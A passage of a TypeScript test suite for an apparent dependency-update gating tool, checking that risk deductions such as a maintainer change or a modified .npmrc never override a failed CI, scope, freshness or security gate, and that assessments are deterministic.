  ],
  ["new-peer", (fixture) => (fixture.to.peerDependencies = { eslint: ">=9", react: "^18" })],
  ["no-tests", (fixture) => (fixture.tests.status = "no-tests")],
  [
    "artifact-difference",
    (fixture) => {
      fixture.input.policy.verification.artifacts = { command: ["pnpm", "build"], paths: ["dist"] };
      fixture.input.evidence.artifacts = {
        ...meta("artifacts", "sandbox", HEAD),
        status: "ok",
        data: { command: ["pnpm", "build"], differing: ["dist/index.js"] },
      };
    },
  ],
  ["maintainer-change", (fixture) => (fixture.to.publisher = "mallory")],
  [
    "unusual-release",
    (fixture) => {
      if (fixture.registry.previousRelease !== null)
        fixture.registry.previousRelease.publishedAt = daysBefore(800);
    },
  ],
];

/** Each fails one gate of an otherwise safe fixture. */
const FAILING_GATES: ReadonlyArray<[GateId, (fixture: Fixture) => void]> = [
  ["ci", (fixture) => (fixture.checks.checks = [{ name: "test", state: "fail" }])],
  [
    "change-scope",
    (fixture) =>
      fixture.changes.files.push({ path: ".npmrc", status: "modified", previousPath: null }),
  ],
  ["evidence-currency", (fixture) => (fixture.headCheck.headSha = "7777")],
  [
    "security",
    (fixture) => (fixture.input.evidence.advisories = missingItem("advisories", "error", "down")),
  ],
];

test("no combination of deductions overrides a failed gate", () => {
  for (let subset = 0; subset < 2 ** PENALTIES.length; subset += 1) {
    const apply = (fixture: Fixture): void => {
      PENALTIES.forEach(([, penalize], index) => {
        if ((subset >> index) & 1) penalize(fixture);
      });
    };

    const clean = safeFixture();

    apply(clean);

    const baseline = assess(clean.input);

    assert.ok(
      baseline.gates.every((result) => result.status === "PASS"),
      `subset ${subset} passes every gate`,
    );

    if (subset === 0) assert.equal(baseline.decision, "AUTO_MERGE");
    else assert.ok(baseline.deductions.length > 0, `subset ${subset} deducts`);

    for (const [gateId, breakGate] of FAILING_GATES) {
      const fixture = safeFixture();

      apply(fixture);
      breakGate(fixture);

      const assessment = assess(fixture.input);

      assert.notEqual(
        gate(assessment, gateId).status,
        "PASS",
        `${gateId} fails for subset ${subset}`,
      );
      assert.notEqual(assessment.decision, "AUTO_MERGE", `${gateId} with subset ${subset}`);
      assert.equal(assessment.authorization.permitted, false);
    }
  }
});

test("the same input always yields the same assessment, including after a JSON round-trip", () => {
  const fixture = safeFixture();

  addTransitive(fixture, "foo-helper");
  fixture.analysis.findings.push(modelFinding(fixture, { evidenceRef: "changelog" }));

  const first = assess(fixture.input);
  const roundTripped = assessmentInputSchema.parse(JSON.parse(JSON.stringify(fixture.input)));

  assert.deepEqual(assess(fixture.input), first);
  assert.deepEqual(assess(roundTripped), first);
});
